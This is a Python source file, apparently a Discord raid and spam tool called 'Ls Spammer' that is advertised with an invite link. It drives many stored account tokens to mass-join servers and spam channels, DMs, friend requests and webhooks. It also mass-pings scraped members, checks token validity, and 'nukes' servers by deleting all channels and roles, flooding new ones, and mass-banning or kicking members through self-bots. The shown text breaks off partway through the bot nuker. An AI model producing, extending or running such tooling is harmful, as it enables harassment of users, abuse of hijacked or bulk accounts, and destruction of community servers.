# 안녕하세요 ! ! Ls sever#0001 입니다 저희샵을 툴을 사용해주셔서 진심으로 감사드립니다
# 문제점이나 피드백을 해주실 사항이 있다면 https://aztra.xyz/invite/f5zd2wFM 로 오셔서 문의해주시면 감사하겠습니다

import os
from os import system
from secrets import choice
from xml.sax.handler import property_interning_dict
import threading
from discord.ext import commands
import discord
import pyautogui
import time
from requests import post
from random import randint
import re
import http.client
import random
import json
import requests
from threading import Thread
from requests import Session
import base64
import string
import sys

try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    from requests import get
except:
    os.system("pip install requests")
    from requests import get

import threading

try:
    import colorama
except:
    os.system("pip install colorama")
    import colorama

try:
    import discord
except:
    os.system("pip install discord")
    import discord

from discord.ext import commands

try:
    import pyautogui
except:
    os.system("pip install pyautogui")
    import pyautogui

import time
import re

try:
    import http.client
except:
    os.system('pip install python-http-client')
    import http.client

import random

try:
    import json
except:
    os.system('pip install json')
    import json


try:
    import base64
except:
    os.system('pip install base64')
    import base64

import string
import sys
from colorama import Fore

try:
    import emoji as ej
except:
    os.system('pip install emoji')
    import emoji as ej

try:
    import websocket
except:
    os.system('pip install websocket')
    import websocket

try:
    import asyncio
except:
    os.system('pip install asyncio')
    import asyncio

try:
    from bs4 import BeautifulSoup
except:
    os.system('pip install beautifulsoup4')

try:
    from webdriver_manager.chrome import ChromeDriverManager
except:
    os.system('pip install webdriver-manager')
    from webdriver_manager.chrome import ChromeDriverManager

try:
    from PIL import Image
except:
    os.system('pip install pillow')
    from PIL import Image

try:
    import discum
except:
    os.system('pip install discum')
    import discum

try:
    from selenium import webdriver
except:
    os.system('pip install selenium')
    from selenium import webdriver

ur = 'https://discord.com/api/v9/channels/messages'
title = 'Ls SpammerㅣDiscord -- ! ! Ls sever#0001ㅣDiscord Link -- https://aztra.xyz/invite/f5zd2wFM'
system(f'title {title}')
tokens = open('tokens.txt', 'r').read().splitlines()


def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text


def mainHeader(token):
    return {
        "authorization": token,
        "accept": "*/*",
        'accept-encoding': 'gzip, deflate, br',
        "accept-language": "en-GB",
        "content-length": "90",
        "content-type": "application/json",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }


def secondHeader(token):
    return {
        ':authority': 'discord.com',
        ':method': 'PATCH',
        ':path': '/api/v9/users/@me',
        ':scheme': 'https',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US',
        'authorization': token,
        'content-length': '124',
        'content-type': 'application/json',
        'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        'origin': 'https://canary.discord.com',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.616 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MTYiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjQ1OCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5ODgyMywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}


def spammer():
    asc = asyncio.get_event_loop()
    tokens = open('tokens.txt', 'r').read().splitlines()
    clear = lambda: os.system('cls')
    clear()

    colorama.init()




    print(f'{Fore.BLUE}                 ██▓      ██████         ██████  ██▓███   ▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███   {Fore.RESET}')
    print(f'{Fore.BLUE}                ▓██▒    ▒██    ▒       ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒ {Fore.RESET}')
    print(f'{Fore.BLUE}                ▒██░    ░ ▓██▄         ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░▓██    ▓██░▒███   ▓██ ░▄█ ▒ {Fore.RESET}')
    print(f'{Fore.BLUE}                ▒██░      ▒   ██▒        ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄   {Fore.RESET}')
    print(f'{Fore.LIGHTBLUE_EX}                ░██████▒▒██████▒▒      ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒ {Fore.RESET}')
    print(f'{Fore.LIGHTBLUE_EX}                ░ ▒░▓  ░▒ ▒▓▒ ▒ ░      ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░ {Fore.RESET}')
    print(f'{Fore.LIGHTBLUE_EX}                ░ ░ ▒  ░░ ░▒  ░ ░      ░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░ {Fore.RESET}')
    print(f'{Fore.LIGHTBLUE_EX}                 ░ ░   ░  ░  ░        ░  ░  ░  ░░         ░   ▒   ░      ░   ░      ░      ░     ░░   ░   {Fore.RESET}')
    print(f'{Fore.LIGHTBLUE_EX}                    ░  ░      ░              ░                 ░  ░       ░          ░      ░  ░   ░      {Fore.RESET}')
    print(f'{Fore.LIGHTCYAN_EX}                                                                                                          {Fore.RESET}')
    print(f'{Fore.BLUE}                developer by : ! ! Ls sever#0001 Discord Link >> https://aztra.xyz/invite/f5zd2wFM {Fore.RESET}')
    print(f'{Fore.LIGHTCYAN_EX}                                                                                                          {Fore.RESET}')
    
    print(
        f'{Fore.LIGHTBLUE_EX}                                     [1]{Fore.RESET}{Fore.LIGHTCYAN_EX}  Joiner {Fore.RESET}{Fore.LIGHTBLUE_EX}                [7]{Fore.RESET}{Fore.LIGHTCYAN_EX}  Token Onliner{Fore.RESET}')
    print(
        f'{Fore.LIGHTBLUE_EX}                                     [2]{Fore.RESET}{Fore.LIGHTCYAN_EX}  Leaver {Fore.RESET}{Fore.LIGHTBLUE_EX}                [8]{Fore.RESET}{Fore.LIGHTCYAN_EX}  Token Checker{Fore.RESET}')
    print(
        f'{Fore.LIGHTBLUE_EX}                                     [3]{Fore.RESET}{Fore.LIGHTCYAN_EX}  Spammer {Fore.RESET}{Fore.LIGHTBLUE_EX}               [9]{Fore.RESET}{Fore.LIGHTCYAN_EX}  Server Nuker{Fore.RESET}')
    print(
        f'{Fore.LIGHTBLUE_EX}                                     [4]{Fore.RESET}{Fore.LIGHTCYAN_EX}  Friend Spammer {Fore.RESET}{Fore.LIGHTBLUE_EX}        [10]{Fore.RESET}{Fore.LIGHTCYAN_EX} Account Nuker{Fore.RESET}')
    print(
        f'{Fore.LIGHTBLUE_EX}                                     [5]{Fore.RESET}{Fore.LIGHTCYAN_EX}  Webhook Spammer {Fore.RESET}{Fore.LIGHTBLUE_EX}       [11]{Fore.RESET}{Fore.LIGHTCYAN_EX} About{Fore.RESET}')
    print(
        f'{Fore.LIGHTBLUE_EX}                                     [6]{Fore.RESET}{Fore.LIGHTCYAN_EX}  DM Spammer {Fore.RESET}{Fore.LIGHTBLUE_EX}            [12]{Fore.RESET}{Fore.LIGHTCYAN_EX} Exit{Fore.RESET}')

    choice = input(
                f'{Fore.LIGHTBLUE_EX}                                     [?]> {Fore.RESET}')



    if choice == '1':

        http.client._is_legal_header_name = re.compile(rb'[^\s][^:\r\n]*').fullmatch


        tokens = open("tokens.txt", "r").read().splitlines()


        def join(invite, token):  # with this code help me my friend H0LLOW
            token = token.replace("\r", "")
            token = token.replace("\n", "")
            headers = {
                ":authority": "canary.discord.com",
                ":method": "POST",
                ":path": "/api/v9/invites/" + invite,
                ":scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "Authorization": token,
                "content-length": "0",
                "cookie": "__dcfduid=75af9050ff6211ebad731ffdee3c037e; __sdcfduid=75af9051ff6211ebad731ffdee3c037e933998e6356b1dffdf296486c9c67f3f52108589d44d26d29febc86909e52537; __stripe_mid=b1d29ec9-19c8-41d7-9ace-e35266d8e9d1725cd3; __cfruid=402026f51d740991320e719ec5b87763fb9f0b58-1630164866",
                "origin": "https://canary.discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            }
            requests.post("https://discordapp.com/api/v9/invites/" + invite, headers=headers)


        invite = input("Discord server invite: ")
        invite = invite.replace("https://discord.gg/", "")
        invite = invite.replace("discord.gg/", "")
        invite = invite.replace("https://discord.com/invite/", "")

        delay = float(input('Delay: '))


        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=join, args=(invite, token)).start()


        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done')


        exit = input('press any key: ')
        exit = spammer()


    if choice == '2':

        token = open("tokens.txt", "r").read().splitlines()

        ID = input('Discord Server ID: ')

        apilink = "https://discordapp.com/api/v9/users/@me/guilds/" + str(ID)

        with open('tokens.txt', 'r') as handle:
            tokens = handle.readlines()
            for i in tokens:
                token = i.rstrip()
                headers = {
                    'Authorization': token
                }
                requests.delete(apilink, headers=headers)
            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Successfully left guild')

        exit = input('press any key: ')
        exit = spammer()


    if choice == '3':
        tokens = open("tokens.txt", "r").read().splitlines()
        server = input(f'Server ID: ')
        channel = input(f'Chanel ID: ')
        mess = input(f'Message: ')
        delay = float(input(f'Delay: '))
        ch = input('Do you want append random string: y/n?: ').lower()
        mas = input('MassPing y/n?: ').lower()

        if mas == 'y':
            with open("tokens.txt") as f:
                firstline = f.readline().rstrip()
            bot = discum.Client(token=firstline)

            def close_after_fetching(resp, guild_id):
                if bot.gateway.finishedMemberFetching(guild_id):
                    lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                    print(str(lenmembersfetched) + ' members fetched')
                    bot.gateway.removeCommand(
                        {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                    bot.gateway.close()

            def get_members(guild_id, channel_id):
                bot.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
                bot.gateway.command(
                    {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guild_id).members

            members = get_members(server, channel)
            memberslist = []

            for memberID in members:
                memberslist.append(memberID)
                print(memberID)

            f = open('staff/users.txt', "w")
            for element in memberslist:
                f.write(f'<@{element}>' + '\n')
            f.close()

        def spam(token, mess):
            if mas == 'y':
                with open("staff/users.txt", "r") as file:
                    allText = file.read()
                    words = list(map(str, allText.split()))
                    mess += ''.join(random.choice(words))

            if ch == 'y':
                mess += " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))

            elif ch == 'n':
                pass

            else:
                pass

            url = 'https://discord.com/api/v9/channels/' + channel + '/messages'
            payload = {"content": mess, "tts": False}
            header = mainHeader(token)

            while True:
                time.sleep(delay)
                src = requests.post(url, headers=header, json=payload)

                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
                          str(float(ratelimit['retry_after'])) + " seconds")
                    time.sleep(float(ratelimit['retry_after']))

                elif src.status_code == 200:
                    print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{mess} sent')

                elif src.status_code == 401:
                    print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token')
                elif src.status_code == 404:
                    print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Not found ¯\_(ツ)_/¯')
                elif src.status_code == 403:
                    print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Token havent got access to this channel')

        def thread():
            text = mess
            for token in tokens:
                threading.Thread(target=spam, args=(token, text)).start()

        start = input(f'Press eny key to start: ')
        start = thread()

        time.sleep(5)
        exit = input(f'press any key: ')
        clear()
        exit = spammer()


    if choice == '4':

        def friender(token, user):
            try:
                user = user.split("#")
                headers = mainHeader(token)
                payload = {"username": user[0], "discriminator": user[1]}
                src = requests.post('https://discord.com/api/v9/users/@me/relationships', headers=headers,
                                    json=payload)
                if src.status_code == 204:
                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Friend request sent to {user[0]}#{user[1]}! ")
            except Exception as e:
                print(e)

        user = input(f"Username + Tag: ")
        tokens = open("tokens.txt", "r").read().splitlines()
        delay = float(input(f'Delay: '))
        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=friender, args=(token, user)).start()

        time.sleep(5)
        exit = input(f'press any key: ')
        exit = clear()
        exit = spammer()


    if choice == '5':

        def webhkspammer():
            webhook = input("Webhook Link: ")
            message = input("Message: ")
            delay = float(input("Delay: "))

            while True:
                try:
                    time.sleep(delay)
                    _data = requests.post(webhook, json={'content': message})

                    if _data.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{message} sent")
                except:
                    print(
                        f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error, or wrong webhook: {Fore.LIGHTRED_EX}{webhook}{Fore.RESET}")
                    time.sleep(5)

        def thread():
            threading.Thread(target=webhkspammer(), args=(message)).start()

        thread()

        time.sleep(5)
        exit = input(f'press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == '6':

        def DMSpammer(id, message, token):
            header = mainHeader(token)

            payload = {'recipient_id': id}
            r1 = requests.post(f'https://discord.com/api/v9/users/@me/channels', headers=header,
                               json=payload)

            if chrr == 'y':
                message += " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
            elif chrr == 'n':
                pass
            else:
                pass

            payload = {"content": message, "tts": False}
            j = json.loads(r1.content)

            while True:
                r2 = requests.post(f"https://discord.com/api/v9/channels/{j['id']}/messages",
                                   headers=header, json=payload)

                if r2.status_code == 429:
                    ratelimit = json.loads(r2.content)
                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
                          str(float(ratelimit['retry_after'])) + " seconds")
                    time.sleep(float(ratelimit['retry_after']))

                elif r2.status_code == 200:
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}DM sent to {idd}!")

        tokens = open("tokens.txt", "r").read().splitlines()
        user = input(f"User ID: ")
        message = input(f"Message: ")
        delay = int(input('Delay: '))
        chrr = input('Do you want append random string: y/n?: ').lower()


        def thread():
            for token in tokens:
                time.sleep(delay)
                threading.Thread(target=DMSpammer, args=(user, message, token)).start()

        start = input(f'Press enter to start: ')
        start = thread()

        time.sleep(5)
        exit = input(f'press any key: ')
        exit = clear()
        exit = spammer()



    if choice == '7':
        print(f'{Fore.LIGHTBLUE_EX}[1]{Fore.RESET}{Fore.LIGHTCYAN_EX} Online{Fore.RESET}')
        print(f'{Fore.LIGHTBLUE_EX}[2]{Fore.RESET}{Fore.LIGHTCYAN_EX} Do Not Disturb{Fore.RESET}')
        print(f'{Fore.LIGHTBLUE_EX}[3]{Fore.RESET}{Fore.LIGHTCYAN_EX} Idle{Fore.RESET}')
        onlinr = int(input('[?]> '))

        tuk = []

        tokens = open("tokens.txt", "r").read().splitlines()

        asc = asyncio.new_event_loop()
        asyncio.set_event_loop(asc)

        if onlinr == 1:
            for token in tokens:
                bottuk = discord.Client(status=discord.Status.online)
                asc.create_task(bottuk.start(token, bot=False))
                tuk.append(bottuk)
                print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done')
        if onlinr == 2:
            for token in tokens:
                bottuk = discord.Client(status=discord.Status.do_not_disturb)
                asc.create_task(bottuk.start(token, bot=False))
                tuk.append(bottuk)
                print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done')
        if onlinr == 3:
            for token in tokens:
                bottuk = discord.Client(status=discord.Status.idle)
                asc.create_task(bottuk.start(token, bot=False))
                tuk.append(bottuk)
                print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done')

        threading.Thread(target=asc.run_forever).start()

        time.sleep(5)
        exit = input('press any key: ')
        exit = clear()
        exit = spammer()


    if choice == '8':

        def checker(token):
            response = post(f'https://discord.com/api/v6/invite/{randint(1, 9999999)}',
                            headers={'Authorization': token})
            if "You need to verify your account in order to perform this action." in str(
                    response.content) or "401: Unauthorized" in str(response.content):
                return False
            elif response.status_code == 401:
                return 'Invalid'
            else:
                return True


        def manager():
            if __name__ == "__main__":
                try:
                    checked = []
                    with open('tokens.txt', 'r') as tokens:
                        for token in tokens.read().split('\n'):
                            if len(token) > 15 and token not in checked and checker(token) == True:
                                print(f'{Fore.LIGHTGREEN_EX}[+] Valid{Fore.RESET} {token}')
                                checked.append(token)
                            else:
                                print(f'{Fore.LIGHTRED_EX}[-] Invalid{Fore.RESET} {token}')
                    if len(checked) > 0:
                        save = input(f'{len(checked)} Valid\nDo you want to Save only Valid tokens? (y/n): ').lower()
                        if save == 'y':
                            name = 'tokens'
                            with open(f'{name}.txt', 'w') as saveFile:
                                saveFile.write('\n'.join(checked))
                            print(f'Tokens saved to {name}.txt file!')
                except:
                    input('Error, cant open tokens.txt file...... :(!')


        start = input('press any key to start: ')
        start = manager()


        exit = input('press any key to return to the menu: ')
        exit = spammer()

    if choice == '9':

        print(f'{Fore.LIGHTBLUE_EX}[1]{Fore.RESET}{Fore.LIGHTCYAN_EX} Account server Nuker{Fore.RESET}')
        print(f'{Fore.LIGHTBLUE_EX}[2]{Fore.RESET}{Fore.LIGHTCYAN_EX} Bot server Nuker{Fore.RESET}')

        choicee1 = input('[?]>')

        if choicee1 == '1':
            token = input('Account Token: ')
            print(f'{Fore.LIGHTBLUE_EX}[1] {Fore.RESET}{Fore.LIGHTCYAN_EX}Nuker{Fore.RESET}')
            print(f'{Fore.LIGHTBLUE_EX}[2] {Fore.RESET}{Fore.LIGHTCYAN_EX}MassBan/MassKick{Fore.RESET}')
            choicr = input('[?]>')


            if choicr == '1':
                server = input(f'Server ID: ')


                intents = discord.Intents.all()
                intents.members = True

                headerrs = {'Authorization': f'{token}',
                            "accept": "*/*",
                            'origin': 'https://discord.com',
                            'sec - fetch - mode': 'cors',
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            'sec - fetch - site': 'same - origin',
                            'x - debug - options': 'bugReporterEnabled',
                            'x - super - properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAyMTEzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ =='
                            }
                client = commands.Bot(command_prefix="!", case_insensitive=False, self_bot=True, intents=intents)

                class UNuker:
                    def DeleteChannels(self, guild, channel):
                        while True:
                            r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headerrs)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(
                                        f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Deleted Channel {channel}")
                                    break
                                else:
                                    break

                    def DeleteRoles(self, guild, role):
                        while True:
                            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}",
                                                headers=headerrs)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(
                                        f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Deleted Role {role}")
                                    break
                                else:
                                    break

                    async def Scrape(self):
                        await client.wait_until_ready()
                        guildOBJ = client.get_guild(int(server))

                        channelcount = 0
                        with open('staff/channels.txt', 'w') as c:
                            for channel in guildOBJ.channels:
                                c.write(str(channel.id) + "\n")
                                channelcount += 1
                            c.close()

                        rolecount = 0
                        with open('staff/roles.txt', 'w') as r:
                            for role in guildOBJ.roles:
                                r.write(str(role.id) + "\n")
                                rolecount += 1
                            r.close()

                    def SpamChannels(self, guild, name):
                        while True:
                            json = {'name': name, 'type': 0}
                            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headerrs,
                                              json=json)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Created Channel ")
                                    break
                                else:
                                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant create channels')

                    def SpamRoles(self, guild, name):
                        while True:
                            json = {'name': name}
                            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headerrs,
                                              json=json)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Created Role ")
                                    break
                                else:
                                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant create roles')
                                    break

                    async def NukeStart(self):
                        chh = input(f"Channels Names: ")
                        cha = input(f"Channels Amount: ")
                        rn = input(f"Roles Names: ")
                        ra = input(f"Roles Amount: ")

                        channels = open('staff/channels.txt')
                        roles = open('staff/roles.txt')

                        for channel in channels:
                            threading.Thread(target=self.DeleteChannels, args=(server, channel,)).start()
                        for role in roles:
                            threading.Thread(target=self.DeleteRoles, args=(server, role,)).start()
                        for i in range(int(cha)):
                            threading.Thread(target=self.SpamChannels, args=(server, chh,)).start()
                        for i in range(int(ra)):
                            threading.Thread(target=self.SpamRoles, args=(server, rn,)).start()

                    async def Menu(self):
                        await self.Scrape()
                        time.sleep(2)
                        await self.NukeStart()
                        time.sleep(2)
                        await self.Menu()

                    @client.event
                    async def on_ready(*Args):
                        await UNuker().Menu()

                    def Check(self):
                        client.run(token, bot=False)

                if __name__ == "__main__":
                    UNuker().Check()

                time.sleep(5)
                exit = input('press any key: ')
                exit = clear()
                exit = spammer()
            if choicr == '2':
                print(
                    f'{Fore.LIGHTRED_EX}Warning!{Fore.RESET} If you use MassBan or MassKick with a token where the mobile number is not verified, the token will be locked automatically and you will have to verify it.')

                intents = discord.Intents.all()
                intents.members = True

                headerrss = mainHeader(token)
                client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)

                client.remove_command("help")

                class MassBan:

                    def BanMembers(self, guild, member):
                        while True:
                            r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}",
                                             headers=headerrss)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Banning {member}")
                                    break
                                else:
                                    break

                    def KickMembers(self, guild, member):
                        while True:
                            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{member}",
                                                headers=headerrss)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Kicking {member}')
                                    break
                                else:
                                    break

                    async def Scrape(self):
                        guild = input(f'Server ID: ')
                        await client.wait_until_ready()
                        guildOBJ = client.get_guild(int(guild))
                        members = await guildOBJ.chunk()

                        try:
                            os.remove("staff/members.txt")
                        except:
                            pass

                        membercount = 0
                        with open('staff/members.txt', 'w') as m:
                            for member in members:
                                m.write(str(member.id) + "\n")
                                membercount += 1
                            print(f"Info: {membercount} Members")
                            m.close()

                    async def BanExecute(self):
                        guild = input(f'Server ID: ')
                        print()
                        members = open('staff/members.txt')
                        for member in members:
                            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
                        members.close()

                    async def KickExecute(self):
                        guild = input(f'Server ID: ')
                        print()
                        members = open('staff/members.txt')
                        for member in members:
                            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
                        members.close()

                    async def Menu(self):
                        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} MassBan')
                        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} MassKick')

                        choice = input(f'[?]>')
                        if choice == '1':
                            await self.Scrape()
                            time.sleep(3)
                            sure = input('MassBAN y/n?: ').lower()
                            if sure == 'y':
                                await self.BanExecute()
                                time.sleep(2)
                                await self.Menu()

                            if sure == 'n':
                                exit = input('press any key: ')
                                clear = lambda: os.system('cls')
                                exit = clear()
                                exit = spammer()

                        elif choice == '2':
                            await self.Scrape()
                            time.sleep(3)
                            sure = input('MassKick y/n?: ').lower()
                            if sure == 'y':
                                await self.KickExecute()
                                time.sleep(2)
                                await self.Menu()
                            if sure == 'n':
                                exit = input('press any key: ')
                                clear = lambda: os.system('cls')
                                exit = clear()
                                exit = spammer()

                    @client.event
                    async def on_ready(*args):
                        await MassBan().Menu()

                    def Startup(self):
                        try:
                            client.run(token, bot=False)


                        except:
                            print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} Invalid Token')
                            time.sleep(2)
                            exit = input('press any key: ')
                            exit = clear()
                            exit = spammer()

                if __name__ == "__main__":
                    MassBan().Startup()

                time.sleep(5)
                exit = input('press any key: ')
                exit = clear()
                exit = spammer()

        if choicee1 == '2':
            TOKEN = input('Bot token: ')
            MAX_CHANNELS = 500
            print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Nuke')
            print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} MassBan')

            choicee = input('[?]>')

            if choicee == '1':
                chanless = input('Channels names: ')
                spam = input('Message you wanna spam: ')
                print(f'{Fore.LIGHTMAGENTA_EX}For nuke write to chat: !Nuke{Fore.RESET}')
                client = commands.Bot(command_prefix="!")

                @client.command()
                async def Nuke(ctx):
                    await ctx.message.delete()
                    guild = ctx.guild

                    for role in guild.roles:
                        try:
                            await role.delete()
                            print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{role.name} Has been deleted{Fore.RESET}')
                        except:
                            print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}{role.name} Has not been deleted')

                    for channel in guild.channels:
                        try:
                            await channel.delete()
                            print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{channel.name} Has been deleted')
                        except:
                            print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant delete {channel}')

                    try:
                        for i in range(MAX_CHANNELS):
                            await guild.create_text_channel(chanless)
